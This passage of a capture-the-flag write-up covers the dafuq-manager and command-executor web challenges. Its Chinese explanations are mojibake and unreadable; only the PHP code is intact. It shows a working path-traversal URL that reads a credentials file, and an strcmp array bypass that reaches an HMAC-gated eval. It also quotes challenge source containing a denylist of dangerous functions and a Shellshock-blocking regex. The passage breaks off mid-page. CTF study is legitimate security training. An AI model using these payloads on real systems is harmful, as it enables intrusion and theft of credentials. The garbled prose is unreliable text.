<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> &amp;<span class="title">find_user</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $cnt = count($GLOBALS[<span class="string">"users"</span>]);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; $cnt;++$i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($user == $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($pass == <span class="keyword">NULL</span> || ($pass == $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">1</span>] &amp;&amp; $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">7</span>])) &#123;</span><br><span class="line">                <span class="keyword">return</span> $GLOBALS[<span class="string">"users"</span>][$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>è·Ÿè¿›$GLOBALS[â€œusersâ€]</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$GLOBALS[<span class="string">"users"</span>] = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">"guest"</span>, <span class="string">"084e0343a0486ff05530df6c705c8bb4"</span>, <span class="string">"./data/guest"</span>, <span class="string">"https://game1.security.ntu.st/data/guest"</span>, <span class="number">0</span>, <span class="string">"^.ht"</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>å…¶å®æˆ‘ä»¬æœ€ç»ˆå¾—åˆ°çš„ä¹Ÿå°±æ˜¯è¿™ä¸ªæ•°ç»„ï¼Œ$data[6]=1,æ‰€ä»¥ä¸æ»¡è¶³adminåŠŸèƒ½çš„æƒé™è¦æ±‚ï¼Œå¯ä»¥æ€è€ƒä¸€ä¸‹ï¼Œå¦‚æœæƒ³è¦æˆ‘ä»¬ä»¥adminç™»é™†ï¼Œä¼šæœ‰å“ªå‡ ç§æ–¹æ³•å‘¢ï¼Œåˆšæ‰è·Ÿè¿›çš„æ—¶å€™ä¼šå‘ç°htusers.phpæ˜¯å‚¨å­˜ç€ç”¨æˆ·ä¿¡æ¯çš„ï¼Œç¬¬ä¸€ç§æ–¹æ³•æˆ‘ä»¬å¯ä»¥å»è¯»å–é¢˜ä¸­çš„htuseresï¼Œç¬¬äºŒç§å°±æ˜¯sqlæ³¨å…¥ï¼Œç¬¬ä¸‰ç§å°±æ˜¯hashé•¿åº¦æ‰©å±•æ”»å‡»</p>
<p>æ€è€ƒä¸€ä¸‹è¿™å‡ ç§æ–¹æ³•çš„å¯è¡Œæ€§</p>
<ul>
<li>æ–‡ä»¶è¯»å–çš„è¯ï¼Œæœ¬é¢˜æ°å¥½æœ‰ä¸‹è½½åŠŸèƒ½ï¼Œå½“ç„¶å…¶ä»–å‡½æ•°ä¹Ÿå¯ä»¥è¯»æºç ï¼Œæ¯”å¦‚file_get_contents,readfile,fopenä¹‹ç±»çš„</li>
<li>sqlæ³¨å…¥â€¦æˆ‘è¿ä¸ªselectè¯­å¥éƒ½æ²¡çœ‹åˆ°ï¼Œåº”è¯¥ä¸å¯èƒ½</li>
<li>hashé•¿åº¦æ‰©å±•æ”»å‡»ï¼Œæ²¡æœ‰å…³é”®çš„ä»£ç å‡ºç°ï¼Œä¹Ÿä¸å¯èƒ½</li>
</ul>
<p>æ‰€ä»¥æœ€ç»ˆæ”»å‡»ç‚¹è¿˜æ˜¯è½åœ¨æ–‡ä»¶è¯»å–ï¼Œæˆ‘ä»¬å¯ä»¥å»è¯»é¢˜ç§çš„htusers.phpæ¥å¾—åˆ°ç”¨æˆ·çš„ä¿¡æ¯ï¼Œé¦–å…ˆå»çœ‹ä¸€ä¸‹downloadåŠŸèƒ½ï¼Œå› ä¸ºä¸€èˆ¬æ‹¿åˆ°æºç éƒ½æ˜¯é€šè¿‡download</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> (<span class="string">'core/secure.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    $item = basename($item);</span><br><span class="line">    <span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $abs_item = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">...</span><br><span class="line">    @readfile($abs_item);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆè·Ÿè¿›çº¦æŸæ¡ä»¶è¿›è¡Œä¸€äº›å°è¯•</p>
<p>$GLOBALS[â€œpermissionsâ€] &amp; 01ï¼Œæˆ‘ä»¬èº«ä¸ºguestè¿˜æ˜¯å¾ˆæ»¡è¶³è¿™ä¸ªæ¡ä»¶çš„</p>
<p>get_is_fileå‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_is_file</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> @is_file(get_abs_item($dir, $item));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>è·Ÿè¿›get_abs_item</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_abs_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> get_abs_dir($dir) . <span class="string">"/"</span> . $item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_abs_dir</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">    $abs_dir = $GLOBALS[<span class="string">"home_dir"</span>]; <span class="comment">//home_dir="data/guest"</span></span><br><span class="line">    <span class="keyword">if</span> ($dir != <span class="string">""</span>) $abs_dir.= <span class="string">"/"</span> . $dir;</span><br><span class="line">    <span class="keyword">return</span> $abs_dir;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨$dirä¸ºç©ºçš„æƒ…å†µä¸‹å…¶å®å°±æ˜¯ç”¨is_fileå¯¹data/guest/$itemè¿›è¡Œåˆ¤æ–­ï¼Œé‚£ä¹ˆè¿™ä¸ªæ¡ä»¶ä¹Ÿè‚¯å®šæ˜¯æ»¡è¶³çš„</p>
<p><strong>è·Ÿè¿›get_show_item</strong></p>
<p>å‘ç°åŠé€€ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$abs_item = get_abs_item($dir, $item);<span class="comment">//     /$item</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">$browser = id_browser();</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå‘ç°.phpæˆ–è€…configç›´æ¥ä¸è§£é‡Šè¿”å›falseï¼Œæ­£å¥½æˆ‘ä»¬éœ€è¦è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥downloadè¿™ä¸ªåœ°æ–¹æ˜¯ä¸è¡Œäº†ï¼Œæ¥ç€æ¢ä¸ªæ€è·¯ï¼Œå…¨å±€æœç´¢ä¸€ä¸‹readfile,file_get_contentsï¼Œfopenè¿™æ ·çš„å‡½æ•°</p>
<p><strong>æœ€ååœ¨fun_edit.phpä¸­çš„edit_fileä¸­å‘ç°fopenï¼Œé‡æ–°å›åˆ°å…¥å£ï¼Œå‘ç°actionä¸ºeditä¹Ÿæ­£å¥½å¯¹åº”edit_fileè¿™ä¸ªå‡½æ•°ï¼Œè·Ÿè¿›edit_file</strong></p>
<p>å‰ä¸‰ä¸ªæ¡ä»¶éƒ½æ˜¯æ­£å¸¸ç¬¦åˆçš„ï¼Œåœ¨get_show_itemä¸­å…¶å®ä»–æ˜¯å­˜åœ¨è¿‡æ»¤çš„ï¼Œåªä¸è¿‡å¯èƒ½è¿‡æ»¤çš„ä¸å¤ªå¯¹ï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ®µä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_show_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($item == <span class="string">"."</span> || $item == <span class="string">".."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure>

<p>åŸºæœ¬ç›¸å½“äºæ²¡ä½œç”¨å§ï¼Œæ¥ç€å›å»</p>
<p>åœ¨$dirç½®ç©ºçš„æƒ…å†µä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fname = get_abs_item($dir, $item);</span><br></pre></td></tr></table></figure>

<p>$fname=data/guest.$item</p>
<p>æ¥ä¸‹æ¥è°ƒç”¨file_in_webå‡½æ•°åˆ¤æ–­fname</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!file_in_web($fname)) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_in_web</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $file = realpath($file);</span><br><span class="line">    <span class="keyword">if</span>(strpos($file, ROOT) !== <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è¦è¯»çš„è·¯å¾„å­—ç¬¦ä¸²é‡Œé¢æ˜¯æœ‰ROOTçš„ï¼Œæ‰€ä»¥è¿”å›trueç¬¦åˆæ¡ä»¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"dosave"</span>]) &amp;&amp; $GLOBALS[<span class="string">'__POST'</span>][<span class="string">"dosave"</span>] == <span class="string">"yes"</span>) &#123;</span><br><span class="line">    $item = basename(stripslashes($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"fname"</span>]));</span><br><span class="line">    $fname2 = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($item) || $item == <span class="string">""</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"miscnoname"</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($fname != $fname2 &amp;&amp; @file_exists($fname2)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"itemdoesexist"</span>]);</span><br><span class="line">    savefile($dir, $fname2);</span><br><span class="line">    $fname = $fname2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªä¸postç›´æ¥å°±å‘ä¸‹æ‰§è¡Œäº†</p>
<p>é€šè¿‡å¦‚ä¸‹ä»£ç è¾“å‡ºæ–‡ä»¶å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$fp = @fopen($fname, <span class="string">"r"</span>);</span><br><span class="line">$buffer = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">    $buffer.= fgets($fp, <span class="number">4096</span>);</span><br><span class="line">&#125;</span><br><span class="line">@fclose($fp);</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars($buffer);</span><br></pre></td></tr></table></figure>

<p>ä»¥åæˆ‘å…¨å±€æœç´¢å†åŠ ä¸ªbuffer.233</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//dafuq-manager.hackme.inndy.tw/index.php?action=edit&amp;item=../../../../../var/www/webhdisk/.config/.htusers.php</span></span><br></pre></td></tr></table></figure>

<p>/var/www/webhdisk/data/guestä¸€å…±æœ‰äº”å±‚ï¼Œæ‰€ä»¥éœ€è¦å‘ä¸Šè·³äº”å±‚ï¼Œæœ€ç»ˆæ‹¿åˆ°æ–‡ä»¶å†…å®¹</p>
<p><img src="https://s2.ax1x.com/2019/10/22/KGedv4.png" alt="KGedv4.png"></p>
<h3 id="dafuq-manager-3"><a href="#dafuq-manager-3" class="headerlink" title="dafuq-manager 3"></a>dafuq-manager 3</h3><p>æ‹¿shellå‘½ä»¤æ‰§è¡Œï¼Œå…¨å±€æœç´¢eval,assertä¹‹ç±»çš„ï¼Œå‘ç°åœ¨debugçš„åœ°æ–¹å­˜åœ¨é—®é¢˜</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_debug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    assert(strlen($GLOBALS[<span class="string">'secret_key'</span>]) &gt; <span class="number">40</span>);</span><br><span class="line">    $dir = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'dir'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strcmp($dir, <span class="string">"magically"</span>) || strcmp($dir, <span class="string">"hacker"</span>) || strcmp($dir, <span class="string">"admin"</span>)) &#123;</span><br><span class="line">        show_error(<span class="string">'You are not hacky enough :('</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">list</span>($cmd, $hmac) = explode(<span class="string">'.'</span>, $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'command'</span>], <span class="number">2</span>);</span><br><span class="line">    $cmd = base64_decode($cmd);</span><br><span class="line">    $bad_things = <span class="keyword">array</span>(<span class="string">'system'</span>, <span class="string">'exec'</span>, <span class="string">'popen'</span>, <span class="string">'pcntl_exec'</span>, <span class="string">'proc_open'</span>, <span class="string">'passthru'</span>, <span class="string">'`'</span>, <span class="string">'eval'</span>, <span class="string">'assert'</span>, <span class="string">'preg_replace'</span>, <span class="string">'create_function'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'curl'</span>,);</span><br><span class="line">    <span class="keyword">foreach</span> ($bad_things <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr($cmd, $bad)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'2bad'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hash_equals(hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]), $hmac)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="keyword">eval</span>($cmd));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_error(<span class="string">'What does the fox say?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªä»£ç å°±æ¯”è¾ƒç®€å•äº†ï¼Œsecretæˆ‘ä»¬çŸ¥é“ï¼Œä¸»è¦bypassçš„ä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strcmp($dir, <span class="string">"magically"</span>) || strcmp($dir, <span class="string">"hacker"</span>) || strcmp($dir, <span class="string">"admin"</span>)) &#123;</span><br><span class="line">    show_error(<span class="string">'You are not hacky enough :('</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå¿…é¡»ä¸‰ä¸ªéƒ½è¿”å›0æ‰èƒ½é¿å…show_errorï¼Œä½†æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ä¸å¯èƒ½åŒæ—¶æ˜¯è¿™ä¸‰ä¸ªå­—ç¬¦ä¸²ï¼Œä¸è¿‡strcmpæœ‰ç»å…¸çš„æ•°ç»„ç»•è¿‡ï¼Œç›´æ¥å°±å¯ä»¥bypassäº†ï¼Œä¼ ç»™dir[]=1,å…¶ä»–çš„ç…§å¸¸ï¼Œå°±å¯ä»¥æˆåŠŸå‘½ä»¤æ‰§è¡Œäº†ã€‚</p>
<h3 id="command-executor"><a href="#command-executor" class="headerlink" title="command-executor"></a>command-executor</h3><p>è¿™é¢˜æä¾›äº†å‡ ä¸ªåŠŸèƒ½</p>
<ul>
<li>Tar File</li>
<li>Cmd exec(åªèƒ½æ‰§è¡Œlså’Œenv)</li>
<li>lsï¼ˆæŸ¥çœ‹å„ä¸ªç›®å½•çš„å†…å®¹)</li>
</ul>
<p>é¦–å…ˆé€šè¿‡lsåŠŸèƒ½å‘ç°æ ¹ç›®å½•æœ‰flagå’Œflag-readerï¼Œè€Œä¸”å¯ä»¥é€šè¿‡phpä¼ªåè®®è¯»æºç </p>
<p>ä¸»è¦ä»£ç è¿˜æ˜¯index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pages = [</span><br><span class="line">    [<span class="string">'man'</span>, <span class="string">'Man'</span>],</span><br><span class="line">    [<span class="string">'untar'</span>, <span class="string">'Tar Tester'</span>],</span><br><span class="line">    [<span class="string">'cmd'</span>, <span class="string">'Cmd Exec'</span>],</span><br><span class="line">    [<span class="string">'ls'</span>, <span class="string">'List files'</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">    header(<span class="string">'Content-Type: text/plain'</span>);</span><br><span class="line">    <span class="keyword">echo</span> $msg;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$black_list = [</span><br><span class="line">    <span class="string">'\/flag'</span>, <span class="string">'\(\)\s*\&#123;\s*:;\s*\&#125;;'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $black_list;</span><br><span class="line">    <span class="keyword">if</span>(is_array($a)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($black_list <span class="keyword">as</span> $b) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/$b/"</span>, $a) === <span class="number">1</span>) &#123;</span><br><span class="line">                fuck(<span class="string">"$b detected! exit now."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cmd, $shell=<span class="string">'bash'</span>)</span> </span>&#123;</span><br><span class="line">    system(sprintf(<span class="string">'%s -c %s'</span>, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">'HTTP_'</span>) &#123;</span><br><span class="line">        putenv(<span class="string">"$key=$val"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func'</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'func'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($page, <span class="string">'..'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $page = <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($page &amp;&amp; strlen($page) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">"$page.php"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_default</span><span class="params">()</span> </span>&#123; <span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;Welcome to <span class="keyword">use</span> <span class="title">our</span> <span class="title">developer</span> <span class="title">assistant</span> <span class="title">service</span>. <span class="title">We</span> <span class="title">provide</span> <span class="title">servial</span> <span class="title">useless</span> <span class="title">features</span> <span class="title">to</span> <span class="title">make</span> <span class="title">your</span> <span class="title">developing</span> <span class="title">life</span> <span class="title">harder</span>.&lt;/<span class="title">p</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="title">img</span> <span class="title">src</span>="<span class="title">windows</span>-<span class="title">run</span>.<span class="title">jpg</span>" <span class="title">alt</span>="<span class="title">command</span> <span class="title">executor</span>"&gt;</span><br><span class="line">&lt;?<span class="title">php</span> &#125;</span><br><span class="line">?&gt;&lt;!<span class="title">DOCTYPE</span> <span class="title">html</span>&gt;</span><br><span class="line">&lt;<span class="title">html</span> <span class="title">lang</span>="<span class="title">en</span>"&gt;</span><br><span class="line">  &lt;<span class="title">head</span>&gt;</span><br><span class="line">    &lt;<span class="title">meta</span> <span class="title">charset</span>="<span class="title">UTF</span>-8"&gt;</span><br><span class="line">    &lt;<span class="title">title</span>&gt;<span class="title">Command</span> <span class="title">Executor</span>&lt;/<span class="title">title</span>&gt;</span><br><span class="line">    &lt;<span class="title">link</span> <span class="title">rel</span>="<span class="title">stylesheet</span>" <span class="title">href</span>="<span class="title">bootstrap</span>/<span class="title">css</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">css</span>" <span class="title">media</span>="<span class="title">all</span>"&gt;</span><br><span class="line">    &lt;<span class="title">link</span> <span class="title">rel</span>="<span class="title">stylesheet</span>" <span class="title">href</span>="<span class="title">comic</span>-<span class="title">neue</span>/<span class="title">font</span>.<span class="title">css</span>" <span class="title">media</span>="<span class="title">all</span>"&gt;</span><br><span class="line">    &lt;<span class="title">style</span>&gt;</span><br><span class="line">      <span class="title">nav</span> &#123; <span class="title">margin</span>-<span class="title">bottom</span>: 1<span class="title">rem</span>; &#125;</span><br><span class="line">      img &#123; max-width: <span class="number">100</span>%; &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex"&gt;</span><br><span class="line">      &lt;a class="navbar-brand" href="index.php"&gt;Command Executor&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">      &lt;ul class="navbar-nav"&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>($pages <span class="keyword">as</span> <span class="keyword">list</span>($file, $title)): <span class="meta">?&gt;</span></span><br><span class="line">        &lt;li class="nav-item"&gt;</span><br><span class="line">          &lt;a class="nav-link" href="index.php?func=&lt;?=$file?&gt;"&gt;&lt;?=$title?&gt;&lt;/a&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>; <span class="meta">?&gt;</span></span><br><span class="line">      